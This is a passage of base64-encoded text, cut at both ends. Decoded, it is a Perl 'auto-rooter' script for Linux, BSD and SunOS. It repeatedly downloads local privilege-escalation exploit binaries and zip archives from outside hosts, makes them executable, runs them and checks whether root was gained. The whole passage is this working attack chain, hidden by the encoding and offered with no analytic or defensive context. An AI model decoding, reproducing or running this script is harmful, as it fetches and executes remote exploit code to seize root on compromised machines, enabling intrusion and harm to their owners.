sKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4xOC0xOTQuMS0yMDEwIik7CnN5c3RlbSgiY2htb2QgNzc3IDIuNi4xOC0xOTQuMS0yMDEwIik7CnN5c3RlbSgiLi8yLjYuMTgtMTk0LjEtMjAxMCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjE4LTE5NC4yLTIwMTAiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjE4LTE5NC4yLTIwMTAiKTsKc3lzdGVtKCIuLzIuNi4xOC0xOTQuMi0yMDEwIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMi1ob29seXNoaXQiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjItaG9vbHlzaGl0Iik7CnN5c3RlbSgiLi8yLjYuMi1ob29seXNoaXQiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4yMCIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMjAiKTsKc3lzdGVtKCIuLzIuNi4yMCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIwLTIiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjIwLTIiKTsKc3lzdGVtKCIuLzIuNi4yMC0yIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgoKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4yMi0yMDA4Iik7CnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMi0yMDA4Iik7CnN5c3RlbSgiLi8yLjYuMjItMjAwOCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIyLTYtODZfNjQtMjAwNyIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMjItNi04Nl82NC0yMDA3Iik7CnN5c3RlbSgiLi8yLjYuMjItNi04Nl82NC0yMDA3Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMjMtMi42LjI0Iik7CnN5c3RlbSgiY2htb2QgNzc3IDIuNi4yMy0yLjYuMjQiKTsKc3lzdGVtKCIuLzIuNi4yMy0yLjYuMjQiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4yMy0yLjYuMjRfMiIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMjMtMi42LjI0XzIiKTsKc3lzdGVtKCIuLzIuNi4yMy0yLjYuMjRfMiIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjIzLTIuNi4yNyIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMjMtMi42LjI3Iik7CnN5c3RlbSgiLi8yLjYuMjMtMi42LjI3Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMjQiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjI0Iik7CnN5c3RlbSgiLi8yLjYuMjQiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi4yNy43LWdlbmVyaSIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMjcuNy1nZW5lcmkiKTsKc3lzdGVtKCIuLzIuNi4yNy43LWdlbmVyaSIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjI4LTIwMTEiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjI4LTIwMTEiKTsKc3lzdGVtKCIuLzIuNi4yOC0yMDExIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuMzItNDYuMS5CSHNtcCIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuMzItNDYuMS5CSHNtcCIpOwpzeXN0ZW0oIi4vMi42LjMyLTQ2LjEuQkhzbXAiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi41X2hvb2x5c2hpdCIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuNV9ob29seXNoaXQiKTsKc3lzdGVtKCIuLzIuNi41X2hvb2x5c2hpdCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjYtMzQiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjYtMzQiKTsKc3lzdGVtKCIuLzIuNi42LTM0Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuNi0zNF9oMDBseXNoaXQiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjYtMzRfaDAwbHlzaGl0Iik7CnN5c3RlbSgiLi8yLjYuNi0zNF9oMDBseXNoaXQiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi42X2gwMGx5c2hpdCIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuNl9oMDBseXNoaXQiKTsKc3lzdGVtKCIuLzIuNi42X2gwMGx5c2hpdCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjdfaDAwbHlzaGl0Iik7CnN5c3RlbSgiY2htb2QgNzc3IDIuNi43X2gwMGx5c2hpdCIpOwpzeXN0ZW0oIi4vMi42LjdfaDAwbHlzaGl0Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOC0yMDA4LjktNjctMjAwOCIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOC0yMDA4LjktNjctMjAwOCIpOwpzeXN0ZW0oIi4vMi42LjgtMjAwOC45LTY3LTIwMDgiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi44LTVfaDAwbHlzaGl0Iik7CnN5c3RlbSgiY2htb2QgNzc3IDIuNi44LTVfaDAwbHlzaGl0Iik7CnN5c3RlbSgiLi8yLjYuOC01X2gwMGx5c2hpdCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjhfaDAwbHlzaGl0Iik7CnN5c3RlbSgiY2htb2QgNzc3IDIuNi44X2gwMGx5c2hpdCIpOwpzeXN0ZW0oIi4vMi42LjhfaDAwbHlzaGl0Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOSIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOSIpOwpzeXN0ZW0oIi4vMi42LjkiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45LTIwMDQiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjktMjAwNCIpOwpzeXN0ZW0oIi4vMi42LjktMjAwNCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjktMjAwOCIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS0yMDA4Iik7CnN5c3RlbSgiLi8yLjYuOS0yMDA4Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS0zNCIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS0zNCIpOwpzeXN0ZW0oIi4vMi42LjktMzQiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45LTQyLjAuMy5FTHNtcCIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS00Mi4wLjMuRUxzbXAiKTsKc3lzdGVtKCIuLzIuNi45LTQyLjAuMy5FTHNtcCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjktNDIuMC4zLkVMc21wLTIwMDYiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjktNDIuMC4zLkVMc21wLTIwMDYiKTsKc3lzdGVtKCIuLzIuNi45LTQyLjAuMy5FTHNtcC0yMDA2Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS01NSIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS01NSIpOwpzeXN0ZW0oIi4vMi42LjktNTUiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45LTU1LTIwMDctcHJ2OCIpOwpzeXN0ZW0oImNobW9kIDc3NyAyLjYuOS01NS0yMDA3LXBydjgiKTsKc3lzdGVtKCIuLzIuNi45LTU1LTIwMDctcHJ2OCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjktNTUtMjAwOC1wcnY4Iik7CnN5c3RlbSgiY2htb2QgNzc3IDIuNi45LTU1LTIwMDgtcHJ2OCIpOwpzeXN0ZW0oIi4vMi42LjktNTUtMjAwOC1wcnY4Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yLjYuOS02NzIwMDgiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjktNjcyMDA4Iik7CnN5c3RlbSgiLi8yLjYuOS02NzIwMDgiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIuNi45LjIiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjkuMiIpOwpzeXN0ZW0oIi4vMi42LjkuMiIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMi42LjkxLTIwMDciKTsKc3lzdGVtKCJjaG1vZCA3NzcgMi42LjkxLTIwMDciKTsKc3lzdGVtKCIuLzIuNi45MS0yMDA3Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMDA3Iik7CnN5c3RlbSgiY2htb2QgNzc3IDIwMDciKTsKc3lzdGVtKCIuLzIwMDciKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzIwMDktbG9jYWwiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMjAwOS1sb2NhbCIpOwpzeXN0ZW0oIi4vMjAwOS1sb2NhbCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMjAwOS13dW5kZXJiYXIiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMjAwOS13dW5kZXJiYXIiKTsKc3lzdGVtKCIuLzIwMDktd3VuZGVyYmFyIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8yMSIpOwpzeXN0ZW0oImNobW9kIDc3NyAyMSIpOwpzeXN0ZW0oIi4vMjEiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzMiKTsKc3lzdGVtKCJjaG1vZCA3NzcgMyIpOwpzeXN0ZW0oIi4vMyIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvMy40LjYtOS0yMDA3Iik7CnN5c3RlbSgiY2htb2QgNzc3IDMuNC42LTktMjAwNyIpOwpzeXN0ZW0oIi4vMy40LjYtOS0yMDA3Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC8zMSIpOwpzeXN0ZW0oImNobW9kIDc3NyAzMSIpOwpzeXN0ZW0oIi4vMzEiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzM2LXJjMSIpOwpzeXN0ZW0oImNobW9kIDc3NyAzNi1yYzEiKTsKc3lzdGVtKCIuLzM2LXJjMSIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNCIpOwpzeXN0ZW0oImNobW9kIDc3NyA0Iik7CnN5c3RlbSgiLi80Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC80NCIpOwpzeXN0ZW0oImNobW9kIDc3NyA0NCIpOwpzeXN0ZW0oIi4vNDQiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzQ3Iik7CnN5c3RlbSgiY2htb2QgNzc3IDQ3Iik7CnN5c3RlbSgiLi80NyIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNSIpOwpzeXN0ZW0oImNobW9kIDc3NyA1Iik7CnN5c3RlbSgiLi81Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC81MCIpOwpzeXN0ZW0oImNobW9kIDc3NyA1MCIpOwpzeXN0ZW0oIi4vNTAiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzU0Iik7CnN5c3RlbSgiY2htb2QgNzc3IDU0Iik7CnN5c3RlbSgiLi81NCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNiIpOwpzeXN0ZW0oImNobW9kIDc3NyA2Iik7CnN5c3RlbSgiLi82Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC82NyIpOwpzeXN0ZW0oImNobW9kIDc3NyA2NyIpOwpzeXN0ZW0oIi4vNjciKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzciKTsKc3lzdGVtKCJjaG1vZCA3NzcgNyIpOwpzeXN0ZW0oIi4vNyIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvNy0yIik7CnN5c3RlbSgiY2htb2QgNzc3IDctMiIpOwpzeXN0ZW0oIi4vNy0yIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC83eCIpOwpzeXN0ZW0oImNobW9kIDc3NyA3eCIpOwpzeXN0ZW0oIi4vN3giKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290LzgiKTsKc3lzdGVtKCJjaG1vZCA3NzcgOCIpOwpzeXN0ZW0oIi4vOCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvOSIpOwpzeXN0ZW0oImNobW9kIDc3NyA5Iik7CnN5c3RlbSgiLi85Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC85MCIpOwpzeXN0ZW0oImNobW9kIDc3NyA5MCIpOwpzeXN0ZW0oIi4vOTAiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290Lzk0Iik7CnN5c3RlbSgiY2htb2QgNzc3IDk0Iik7CnN5c3RlbSgiLi85NCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvTGludXhfMi42LjEyIik7CnN5c3RlbSgiY2htb2QgNzc3IExpbnV4XzIuNi4xMiIpOwpzeXN0ZW0oIi4vTGludXhfMi42LjEyIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9MaW51eF8yLjYuOS1qb29seXNoaXQiKTsKc3lzdGVtKCJjaG1vZCA3NzcgTGludXhfMi42Ljktam9vbHlzaGl0Iik7CnN5c3RlbSgiLi8yLjYuMTgtMjAxMSIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvYWNpZCIpOwpzeXN0ZW0oImNobW9kIDc3NyBhY2lkIik7CnN5c3RlbSgiLi9hY2lkIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9kM3ZpbCIpOwpzeXN0ZW0oImNobW9kIDc3NyBkM3ZpbCIpOwpzeXN0ZW0oIi4vZDN2aWwiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2V4cDEiKTsKc3lzdGVtKCJjaG1vZCA3NzcgZXhwMSIpOwpzeXN0ZW0oIi4vZXhwMSIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvZXhwMiIpOwpzeXN0ZW0oImNobW9kIDc3NyBleHAyIik7CnN5c3RlbSgiLi9leHAyIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9leHAzIik7CnN5c3RlbSgiY2htb2QgNzc3IGV4cDMiKTsKc3lzdGVtKCIuL2V4cDMiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2V4cGxvaXQiKTsKc3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdCIpOwpzeXN0ZW0oIi4vZXhwbG9pdCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvZnVsbC1uZWxzb24iKTsKc3lzdGVtKCJjaG1vZCA3NzcgZnVsbC1uZWxzb24iKTsKc3lzdGVtKCIuL2Z1bGwtbmVsc29uIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9nYXlyb3MiKTsKc3lzdGVtKCJjaG1vZCA3NzcgZ2F5cm9zIik7CnN5c3RlbSgiLi9nYXlyb3MiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L2xlbmlzLnNoIik7CnN5c3RlbSgiY2htb2QgNzc3IGxlbmlzLnNoIik7CnN5c3RlbSgiLi9sZW5pcy5zaCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvbG9jYWwtMi42LjktMjAwNS0yMDA2Iik7CnN5c3RlbSgiY2htb2QgNzc3IGxvY2FsLTIuNi45LTIwMDUtMjAwNiIpOwpzeXN0ZW0oIi4vbG9jYWwtMi42LjktMjAwNS0yMDA2Iik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9sb2NhbC1yb290LWV4cGxvaXQtZ2F5cm9zIik7CnN5c3RlbSgiY2htb2QgNzc3IGxvY2FsLXJvb3QtZXhwbG9pdC1nYXlyb3MiKTsKc3lzdGVtKCIuL2xvY2FsLXJvb3QtZXhwbG9pdC1nYXlyb3MiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3ByaXY0Iik7CnN5c3RlbSgiY2htb2QgNzc3IHByaXY0Iik7CnN5c3RlbSgiLi9wcml2NCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvcHdua2VybmVsIik7CnN5c3RlbSgiY2htb2QgNzc3IHB3bmtlcm5lbCIpOwpzeXN0ZW0oIi4vcHdua2VybmVsIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC9yb290LnB5Iik7CnN5c3RlbSgiY2htb2QgNzc3IHJvb3QucHkiKTsKc3lzdGVtKCIuL3Jvb3QucHkiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYmllLm5henVrYS5uZXQvbG9jYWxyb290L3J1bngiKTsKc3lzdGVtKCJjaG1vZCA3NzcgcnVueCIpOwpzeXN0ZW0oIi4vcnVueCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9iaWUubmF6dWthLm5ldC9sb2NhbHJvb3QvdGl2b2xpIik7CnN5c3RlbSgiY2htb2QgNzc3IHRpdm9saSIpOwpzeXN0ZW0oIi4vdGl2b2xpIik7CnN5c3RlbSgiaWQ7d2hvYW1pIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2JpZS5uYXp1a2EubmV0L2xvY2Fscm9vdC91YnVudHUiKTsKc3lzdGVtKCJjaG1vZCA3NzcgdWJ1bnR1Iik7CnN5c3RlbSgiLi91YnVudHUiKTsKc3lzdGVtKCJpZDt3aG9hbWkiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vYS5wb21mLnNlL3R4ZmZndi56aXAiKTsKc3lzdGVtKCJ1bnppcCB0eGZmZ3YuemlwIik7CnN5c3RlbSgiY2htb2QgK3ggdHJvbGxlZCIpOwpzeXN0ZW0oIi4vdHJvbGxlZCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKc3lzdGVtKCJjaG1vZCAreCAzX1giKTsKc3lzdGVtKCIuLzNfWCIpOwpzeXN0ZW0oImlkO3dob2FtaSIpOwoKCgpwcmludCAiRW5kIExpbnV4Li4gWytdXG4iOwp9CmlmICgkQVJHVlswXSA9fiAiYnNkIiApCnsKcHJpbnQgIiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyNcbiI7CnByaW50ICIjIExpbnV4L0JzZC9TdW5vcyBBVVRPLVJPT1RFUiAgI1xuIjsKcHJpbnQgIiMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjXG4iOwpwcmludCAiIyAgICAgICAgSGF2ZSBhIGNvZmZlICAgICAgICAgICNcbiI7CnByaW50ICIjICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI1xuIjsKcHJpbnQgIiMgICAgICAgUm9vdGluZyBCU0QgICAgICAgICAgICAjXG4iOwpwcmludCAiIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsKc3lzdGVtKCJ1bmFtZSAtYTtta2RpciBic2Q7Y2QgYnNkIik7CgpzeXN0ZW0oIndnZXQgaHR0cDovL2EucG9tZi5zZS9qd2dvYm4uemlwIik7CnN5c3RlbSgidW56aXAgandnb2JuLnppcCIpOwpzeXN0ZW0oImNobW9kIDc3NyA0OGxvY2FsIik7CnN5c3RlbSgiLi80OGxvY2FsIik7CnN5c3RlbSgiaWQiKTsKCnN5c3RlbSgiY2htb2QgNzc3IGJzZGxvY2FsIik7CnN5c3RlbSgiLi9ic2Rsb2NhbCIpOwpzeXN0ZW0oImlkIik7CgpzeXN0ZW0oImNobW9kIDc3NyBCU0QzLjZfbG9jYWxyb290Iik7CnN5c3RlbSgiLi9CU0QzLjZfbG9jYWxyb290Iik7CnN5c3RlbSgiaWQiKTsKCgoKCnByaW50ICJFbmQgQnNkLi4gWytdXG4iOwp9CmlmICgkQVJHVlswXSA9fiAic3Vub3MiICkKewpwcmludCAiIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI1xuIjsKcHJpbnQgIiMgTGludXgvQnNkL1N1bm9zIEFVVE8tUk9PVEVSICAjXG4iOwpwcmludCAiIyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICNcbiI7CnByaW50ICIjICAgICAgICBIYXZlIGEgY29mZmUgICAgICAgICAgI1xuIjsKcHJpbnQgIiMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjXG4iOwpwcmludCAiIyAgICAgICBSb290aW5nIFN1bm9zICAgICAgICAgICNcbiI7CnByaW50ICIjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjXG4iOwpzeXN0ZW0oInVuYW1lIC1hO21rZGlyIHN1bm9zO2NkIHN1bm9zIik7CnN5c3RlbSgid2dldCBodHRwOi8vYS5wb21mLnNlL2trcGd2cy56aXAiKTsKc3lzdGVtKCJ1bnppcCBra3BndnMuemlwIik7CnN5c3RlbSgiY2htb2QgNzc3IHhfb3NoLnBsICIpOwpzeXN0ZW0oInBlcmwgeF9vc2gucGwgIik7CnN5c3RlbSgiaWQiKTsKCnN5c3RlbSgid2dldCBodHRwOi8vc